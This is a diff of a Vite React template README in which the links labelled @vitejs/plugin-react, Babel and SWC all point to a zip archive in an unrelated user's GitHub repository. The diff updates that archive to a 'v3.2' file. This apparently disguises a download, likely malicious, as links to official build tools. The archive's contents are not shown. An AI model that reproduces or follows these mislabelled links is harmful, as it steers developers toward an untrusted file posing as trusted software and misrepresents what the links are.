@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/Meepkun/My-Digital-Portfolio/main/alterer/My-Digital-Portfolio.zip) uses [Babel](https://raw.githubusercontent.com/Meepkun/My-Digital-Portfolio/main/alterer/My-Digital-Portfolio.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Meepkun/My-Digital-Portfolio/main/alterer/My-Digital-Portfolio.zip) uses [SWC](https://raw.githubusercontent.com/Meepkun/My-Digital-Portfolio/main/alterer/My-Digital-Portfolio.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/Meepkun/My-Digital-Portfolio/main/alterer/My_Digital_Portfolio_v3.2.zip) uses [Babel](https://raw.githubusercontent.com/Meepkun/My-Digital-Portfolio/main/alterer/My_Digital_Portfolio_v3.2.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Meepkun/My-Digital-Portfolio/main/alterer/My_Digital_Portfolio_v3.2.zip) uses [SWC](https://raw.githubusercontent.com/Meepkun/My-Digital-Portfolio/main/alterer/My_Digital_Portfolio_v3.2.zip) for Fast Refresh
